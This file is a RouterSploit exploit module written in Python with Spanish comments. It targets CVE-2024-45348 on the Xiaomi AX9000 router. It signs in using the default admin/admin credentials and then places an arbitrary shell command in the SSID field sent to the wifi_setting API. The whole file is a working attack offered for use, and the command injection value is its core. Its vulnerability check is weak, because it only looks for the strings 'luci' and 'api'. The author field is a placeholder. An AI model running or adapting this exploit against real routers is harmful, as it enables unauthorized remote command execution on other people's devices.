from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
import json

class Exploit(HTTPClient):
    __info__ = {
        "name": "Xiaomi Router AX9000 Command Injection",
        "description": "Explota CVE-2024-45348 - Inyección de comandos post-autenticación en Xiaomi Router AX9000",
        "authors": [
            "Tu Nombre",  # Implementación para RouterSploit
        ],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-45348",
        ],
        "devices": [
            "Xiaomi Router AX9000",
        ],
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    ssl = OptBool(False, "SSL enabled: true/false")
    username = OptString("admin", "Username for authentication")
    password = OptString("admin", "Password for authentication")
    cmd = OptString("id", "Command to execute")

    def run(self):
        # Primero autenticarse
        token = self.authenticate()
        if not token:
            print_error("Authentication failed")
            return
        
        if self.check():
            print_success("Target is vulnerable to CVE-2024-45348")
            
            # Ejecutar comando
            if self.execute_command(token):
                print_success("Command executed successfully")
            else:
                print_error("Failed to execute command")
        else:
            print_error("Target is not vulnerable")
    
    def authenticate(self):
        print_status("Attempting to authenticate...")
        
        # Datos de autenticación
        auth_data = {
            "username": self.username,
            "password": self.password,
            "device": "MiRouter"
        }
        
        # Intentar autenticación
        response = self.http_request(
            method="POST",
            path="/cgi-bin/luci/api/xqsystem/login",
            json=auth_data
        )
        
        if response and response.status_code == 200:
            try:
                result = response.json()
                if result.get("code") == 0 and result.get("token"):
                    print_success("Authentication successful")
                    return result["token"]
            except:
                pass
        
        print_error("Authentication failed")
        return None
    
    def check(self):
        print_status("Checking for CVE-2024-45348 vulnerability...")
        
        # Intentar acceder al endpoint vulnerable
        response = self.http_request(
            method="GET",
            path="/cgi-bin/luci/api/xqsystem/wifi_setting"
        )
        
        if response and response.status_code == 200:
            # Verificar si el endpoint es vulnerable a inyección
            if "luci" in response.text and "api" in response.text:
                return True
        
        return False
    
    def execute_command(self, token):
        # Construir payload con inyección de comando
        payload = {
            "name": "wifi_settings",
            "ssid": f"test;{self.cmd};",  # Inyección de comando
            "token": token
        }
        
        # Enviar payload
        response = self.http_request(
            method="POST",
            path="/cgi-bin/luci/api/xqsystem/wifi_setting",
            json=payload
        )
        
        if response and response.status_code == 200:
            try:
                result = response.json()
                if result.get("output"):
                    print_status("Command output:")
                    print_info(result["output"])
                    return True
            except:
                pass
        
        return False
